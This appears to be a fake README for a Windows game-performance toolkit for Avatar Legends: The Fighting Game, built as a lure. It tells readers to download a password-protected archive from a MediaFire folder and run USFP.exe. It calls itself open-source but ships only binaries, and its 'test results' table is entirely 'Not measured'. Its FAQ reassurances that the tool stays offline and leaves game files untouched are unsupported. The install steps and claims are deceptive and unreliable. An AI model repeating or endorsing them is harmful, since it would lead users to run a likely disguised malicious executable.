<div align="center">

# 🎮 Avatar Legends: The Fighting Game — Performance Notes

**Measure frame delivery, startup behavior, and session stability.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Avatar Legends: The Fighting Game is a 2D 1v1 fighting game set across the Avatar universe, featuring elemental combat and cinematic special attacks. Public listings describe its genre and setting but do not identify a specific game engine. Consistent frame delivery and low input latency are important for timing-sensitive competitive play.

Windows players and testers who need reproducible diagnostics for Avatar Legends: The Fighting Game.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2424420/c0806cb937719f47ab280c9ae2873cabc83906ef/ss_c0806cb937719f47ab280c9ae2873cabc83906ef.1920x1080.jpg?t=1789506930" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2424420/1cc9e7b04167921419d60f0ef2f76cbd9d00cd21/ss_1cc9e7b04167921419d60f0ef2f76cbd9d00cd21.1920x1080.jpg?t=1789506930" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2424420/5d6d4df613191a4ef7382697833d0a354cee61bc/ss_5d6d4df613191a4ef7382697833d0a354cee61bc.1920x1080.jpg?t=1789506930" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- Frame-time spikes above 16.7 ms can interrupt 60 FPS delivery during effects-heavy attacks.
- Startup shader and graphics-cache work can extend launch time beyond 60 seconds on some systems.
- Long sessions may show intermittent crashes, hangs, or recovery-required exits.

## 🩺 How the toolkit addresses these issues

- **Frame-time spikes during effects-heavy attacks** → Frame Rate Helper — adjusts frame delivery behavior; Frame Timing Helper — stabilizes frame delivery.
- **Extended startup and shader-cache work** → Startup Parameter Tool — applies tuned startup parameters; Graphics Cache Utility — manages graphics cache data.
- **Crashes, hangs, or recovery-required exits** → Stability Report + Session Recovery — diagnostic collection + recovery.

## 📊 Test results

Test rig: Reference validation rig: Ryzen 5 5600, RTX 3060, 16GB RAM, SSD, 1080p, High settings; measured values pending reproducible runs

| Metric | Before | After |
|---|---|---|
| Average FPS | Not measured | Not measured |
| 1% low FPS | Not measured | Not measured |
| Crashes per 2h session | Not measured | Not measured |
| Shader compile time on launch | Not measured | Not measured |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. click Apply
5. on first launch allow the cache to rebuild (1-2 minutes)

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for more consistent presentation.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling for the game and related tasks.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and supports recovery after unstable sessions.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and provides controlled cache rebuilds.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for repeatable launch configuration.
- 🎯 **Frame Timing Helper** — Stabilizes frame delivery and records frame-time behavior.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- core.bin <- Core runtime
|-- shader_cache.pak <- Shader cache data
|-- Password 2026.txt <- Password reminder (empty)
|-- fps_module.dll <- FPS module
|-- config.cfg <- User configuration
|-- crash_reader.dll <- Crash log reader
|-- frame_data.pak <- Display sync data
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

---

*This is an unofficial, open-source tool. Not affiliated with or endorsed by the developer/publisher of **Avatar Legends: The Fighting Game**. All trademarks belong to their respective owners. Use at your own risk — backing up your game's configuration files before applying changes is recommended.*